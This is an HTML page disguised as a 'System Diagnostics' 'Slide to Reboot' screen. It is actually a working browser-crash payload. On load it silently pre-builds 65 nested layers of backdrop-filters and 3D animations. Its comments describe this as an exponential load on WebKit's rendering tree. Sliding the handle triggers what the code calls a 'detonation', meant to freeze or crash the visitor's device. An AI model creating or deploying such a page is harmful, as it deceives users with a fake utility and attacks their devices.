<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Diagnostics</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px 80px 20px;
            overflow: hidden;
            position: relative;
        }

        .header-section {
            text-align: center;
            margin-top: 60px;
            z-index: 10;
            transition: opacity 0.3s;
        }

        h1 {
            font-size: 26px;
            font-weight: 400;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
        }

        p {
            color: #8e8e93;
            font-size: 14px;
            line-height: 1.4;
            max-width: 280px;
            margin: 0 auto;
        }

        .slider-container {
            width: 100%;
            max-width: 340px;
            margin-bottom: 40px;
            z-index: 10;
            transition: opacity 0.3s;
        }

        .slider-track {
            position: relative;
            width: 100%;
            height: 76px;
            background: rgba(35, 35, 35, 0.45);
            border-radius: 38px;
            display: flex;
            align-items: center;
            padding: 4px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden;
        }

        .slider-text {
            position: absolute;
            width: 100%;
            text-align: center;
            left: 0;
            font-size: 16px;
            font-weight: 500;
            pointer-events: none;
            background: linear-gradient(90deg, #4d4d4d 0%, #fff 50%, #4d4d4d 100%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 2.5s infinite linear;
            padding-left: 44px;
        }

        @keyframes shine {
            0% { background-position: -100% 0; }
            100% { background-position: 100% 0; }
        }

        .slider-handle {
            width: 68px;
            height: 68px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            z-index: 2;
            box-shadow: 0 3px 8px rgba(0,0,0,0.3);
            touch-action: none;
        }

        .icon {
            color: #000;
            font-size: 26px;
            transform: scaleX(-1);
        }

        /* --- THE PURE CSS NITRO ENGINE --- */
        #payload-matrix {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 999999;
            pointer-events: none;
            transform-style: preserve-3d;
            -webkit-transform-style: preserve-3d;
            perspective: 1000px;
            -webkit-perspective: 1000px;
        }

        /* The engine class applied to unleash the calculations instantly */
        body.ignited #payload-matrix {
            display: block !important;
        }

        /* Every nested layer forces a recursive frame-buffer pass */
        .nitro-layer {
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            background: linear-gradient(135deg, rgba(255,0,0,0.1), rgba(0,0,255,0.1));
            backdrop-filter: blur(30px) saturate(400%) contrast(300%);
            -webkit-backdrop-filter: blur(30px) saturate(400%) contrast(300%);
            mix-blend-mode: exclusion;
            will-change: transform, filter;
            animation: stressMove 0.1s infinite alternate linear;
            transform-style: preserve-3d;
            -webkit-transform-style: preserve-3d;
        }

        @keyframes stressMove {
            0% { transform: translate3d(2px, -2px, 5px) rotate3d(1, 1, 1, 1deg) scale(1.02); }
            100% { transform: translate3d(-2px, 2px, -5px) rotate3d(-1, -1, -1, -1deg) scale(0.98); }
        }
    </style>
</head>
<body>

    <div class="header-section">
        <h1>Slide to Reboot</h1>
        <p>Initiates structural hardware profiling sequence designed for modern system layers.</p>
    </div>

    <div class="slider-container">
        <div class="slider-track" id="main-track">
            <div class="slider-text">slide to execute</div>
            <div class="slider-handle" id="main-handle">
                <span class="icon">⟳</span>
            </div>
        </div>
    </div>

    <div id="payload-matrix"></div>

    <script>
        // Pre-build the massive CSS hierarchy entirely BEFORE the slide occurs.
        // This makes the transition completely atomic—zero JavaScript overhead at detonation.
        function buildMatrix() {
            const container = document.getElementById('payload-matrix');
            let currentParent = container;

            // 65 levels of deeply nested backdrop-filters and 3D matrices
            // This creates an exponential load scale directly within WebKit's hardware layer tree
            for (let i = 0; i < 65; i++) {
                const layer = document.createElement('div');
                layer.className = 'nitro-layer';
                
                // Slight structural variations to prevent rendering optimization merges
                if (i % 2 === 0) {
                    layer.style.animationDuration = '0.15s';
                    layer.style.mixBlendMode = 'difference';
                }
                
                currentParent.appendChild(layer);
                currentParent = layer; // Nest the next one inside
            }
        }

        function triggerDetonation() {
            // Instantly drop UI visibility to fully dedicate render pipelines to the matrix
            document.querySelector('.header-section').style.opacity = '0';
            document.querySelector('.slider-container').style.opacity = '0';
            
            // Instantly wake up the entire pre-built structure in one single draw call
            document.body.classList.add('ignited');
        }

        function setupSlider() {
            const handle = document.getElementById('main-handle');
            const track = document.getElementById('main-track');
            
            let isDragging = false;
            let startX = 0;
            let maxDelta = 0;

            function getClientX(e) {
                return e.touches ? e.touches[0].clientX : e.clientX;
            }

            function onStart(e) {
                isDragging = true;
                startX = getClientX(e);
                maxDelta = track.clientWidth - handle.clientWidth - 8;
                handle.style.transition = 'none';
            }

            function onMove(e) {
                if (!isDragging) return;
                const currentX = getClientX(e);
                let deltaX = currentX - startX;

                if (deltaX < 0) deltaX = 0;
                if (deltaX > maxDelta) deltaX = maxDelta;

                handle.style.transform = `translateX(${deltaX}px)`;

                const textElement = track.querySelector('.slider-text');
                textElement.style.opacity = (1 - (deltaX / maxDelta));

                if (deltaX >= maxDelta) {
                    isDragging = false;
                    triggerDetonation();
                }
            }

            function onEnd() {
                if (!isDragging) return;
                isDragging = false;
                handle.style.transition = 'transform 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                handle.style.transform = 'translateX(0px)';
                const textElement = track.querySelector('.slider-text');
                textElement.style.transition = 'opacity 0.3s';
                textElement.style.opacity = '1';
            }

            handle.addEventListener('touchstart', onStart, { passive: true });
            window.addEventListener('touchmove', onMove, { passive: false });
            window.addEventListener('touchend', onEnd);

            handle.addEventListener('mousedown', onStart);
            window.addEventListener('mousemove', onMove);
            window.addEventListener('mouseup', onEnd);
        }

        // Initialize the elements silently on load
        buildMatrix();
        setupSlider();
    </script>
</body>
</html>
